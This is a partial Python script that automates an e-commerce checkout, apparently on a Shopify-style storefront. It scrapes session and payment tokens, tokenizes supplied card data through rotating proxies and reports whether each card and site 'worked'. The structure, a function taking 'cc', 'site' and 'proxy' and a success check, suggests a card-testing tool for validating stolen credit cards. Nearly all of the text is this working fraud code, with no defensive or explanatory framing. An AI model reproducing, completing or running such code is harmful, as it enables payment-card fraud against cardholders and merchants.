...
def extract_checkout_meta_data(html):
    ...
    if not data['session_token']:
         p_fallback = r'<meta\s+[^>]*name=["\']serialized-session-token["\'][^>]*content=["\']([^"\']+)["\']'
         m = re.search(p_fallback, html, re.IGNORECASE)
         if m:
             data['session_token'] = unescape(m.group(1)).strip('"')
...
def step1_add_to_cart(session):
    ...
    if '/checkouts/cn/' in final_url:
        ...
        meta = extract_checkout_meta_data(r.text)
        ...
        if payment_method_id:
            print(f"  [OK] Found Payment ID: {payment_method_id[:20]}...")
            
        return checkout_token, session_token, r.cookies, payment_method_id
...
def step3_proposal(session, checkout_token, session_token, card_session_id):
    ...
    if r.status_code == 200:
        try:
            ...
            return queue_token, shipping_handle, merchandise_stable_id, actual_total, delivery_expectations, phone_required, currency_code
            
        except json.JSONDecodeError:
            print(f"  [ERROR] Invalid JSON")
            return None, None, None, None, None, False, "USD"
    else:
...
def step4_submit_completion(session, checkout_token, session_token, queue_token, 
                           ...
                           actual_total, delivery_expectations, phone_required=False, payment_method_identifier=None, currency_code="USD"):
    ...
    input_data = {
        ...
        "payment": {
            ...
            "paymentLines": [{
                "paymentMethod": {
                    "directPaymentMethod": {
                        "paymentMethodIdentifier": payment_method_identifier or "bfe4013b52b37df95b64c063a41da319",
    ...
    input_data["deliveryExpectations"] = {
        "deliveryExpectationLines": delivery_expectation_lines if delivery_expectation_lines else []
    }
...
def step1_add_to_cart_ctx(session, shop_url, variant_id, _429_retry_count=0):
    ...
    if '/checkouts/cn/' in final_url:
        ...
        meta = extract_checkout_meta_data(r.text)
        session_token = meta["session_token"]
        payment_method_identifier = meta["payment_method_id"]
        stable_id = meta["stable_id"]
        
        if payment_method_identifier:
             print(f"  [OK] Payment Method Identifier: {payment_method_identifier[:30]}...")
             
        return checkout_token, session_token, r.cookies, payment_method_identifier, stable_id
    ...
    for attempt in range(max_attempts):
        ...
        try:
            ...
            if exp_typename == 'FilledDeliveryExpectationTerms':
                ...
                print(f"  ✓ Got {len(delivery_expectations)} delivery expectations")
            if shipping_handle and delivery_expectations and actual_total:
                print(f"  [POLL] ✓ Complete! Handle: {shipping_handle[:30]}..., Total: ${actual_total} {currency_code}")
                return queue_token, shipping_handle, shipping_amount, actual_total, delivery_expectations, currency_code
            poll_delay = 500
            if delivery_typename == 'PendingTerms':
                poll_delay = delivery_terms.get('pollDelay', 500)
            elif exp_typename == 'PendingTerms':
            ...
            continue
    print(f"  [POLL] Timed out after {max_attempts} attempts")
    return queue_token, shipping_handle, shipping_amount, actual_total, delivery_expectations, "USD"
                ...
                if typename == 'FilledDeliveryExpectationTerms':
                    ...
                    if not actual_total:
                        ...
                        if checkout_total.get('__typename') == 'MoneyValueConstraint':
                            ...
                            currency_code = value.get('currencyCode', 'USD')
                    if actual_total:
                        print(f"  [POLL] Total: ${actual_total} {currency_code}")
                    print(f"  [POLL] Found {len(delivery_expectations)} expectations")
                    return queue_token, delivery_expectations, actual_total, currency_code
                elif typename == 'PendingTerms':
                    poll_delay = delivery_exp_terms.get('pollDelay', 2000)
                    wait_seconds = min(poll_delay / 1000.0, 3.0)
                    time.sleep(wait_seconds)
    ...
    if r.status_code == 200:
        try:
            ...
            if 'errors' in response:
                ...
                for error in response['errors']:
                    print(f"    - {error.get('message', 'Unknown')}")
                return None, None, None, None, None, False, "USD", None
            result = response.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
            if result.get('__typename') != 'NegotiationResultAvailable':
                return None, None, None, None, None, False, "USD", None
            queue_token = result.get('queueToken')
            ...
            if typename == 'FilledDeliveryExpectationTerms':
                ...
                if delivery_typename == 'PendingTerms':
                    ...
                    if poll_result[0]:
                        queue_token_new, shipping_handle_new, shipping_amount_new, actual_total_new, delivery_expectations_new, currency_code_new = poll_result
                        if queue_token_new:
                            queue_token = queue_token_new
                        if shipping_handle_new:
                            shipping_handle = shipping_handle_new
                    ...
                    if polled_data and polled_data[0]:
                        if len(polled_data) >= 4:
                            queue_token_new, delivery_expectations_new, actual_total_new, currency_code_new = polled_data
                            if actual_total_new:
                                actual_total = actual_total_new
                                currency_code = currency_code_new
                        elif len(polled_data) >= 3:
...
def step4_submit_completion_ctx(session, checkout_token, session_token, queue_token,
                                shipping_handle, merchandise_stable_id, card_session_id,
                                actual_total, delivery_expectations, shop_url, variant_id, phone_required=False, payment_method_identifier=None, currency_code="USD", shipping_amount=None):
    print("[4/5] Submitting for completion...")
    print(f"  [INFO] Phone requirement: {phone_required}")
    ...
    while site_attempt < len(sites) and not worked:
        ...
        while attempts < max_attempts and not worked and not site_skipped:
            ...
            if not variant_id:
                ...
                continue
            print(f"\n✅ Using: {title}")
            step1_result = step1_add_to_cart_ctx(session, shop_url, variant_id)
            if len(step1_result) >= 5:
                checkout_token, session_token, cookies, payment_method_identifier, stable_id_extracted = step1_result
            elif len(step1_result) >= 4:
                checkout_token, session_token, cookies, payment_method_identifier = step1_result
            else:
            ...
            receipt_result = step4_submit_completion_ctx(
                ...
                payment_method_identifier, currency_code, shipping_amount
            )
            if isinstance(receipt_result, tuple):
                if len(receipt_result) >= 4:
                    receipt_id, submit_code, submit_message, submit_resp = receipt_result
...
def process_checkout(cc, site, proxy=None):
    global SHOP_URL, VARIANT_ID, CARD_DATA
    ...
    try:
        ...
        VARIANT_ID = vid
        result["site"] = "Working"
        if proxy: result["proxy"] = "Working"

        checkout_token, session_token, cookies, payment_method_id, stable_id = step1_add_to_cart_ctx(session, base_shop_url, vid)
        if not checkout_token:
            result["response"] = "Step 1 Failed (No Token)"
            return result
        
        card_session_id = step2_tokenize_card_ctx(session, checkout_token, base_shop_url, card_data)
        if not card_session_id:
            result["response"] = "Step 2 Failed (Tokenization)"
            return result
        ...
        if not queue_token or not shipping_handle:
             result["response"] = "Step 3 Failed (No Shipping)"
             return result
        ...
        receipt_result = step4_submit_completion_ctx(
            session, checkout_token, session_token, queue_token,
            shipping_handle, merchandise_id, card_session_id,
            actual_total, delivery_expectations, base_shop_url, vid, 
        ...
        result["response"] = code_display.strip('"')
        if success or "SUCCESS" in code_display.upper():
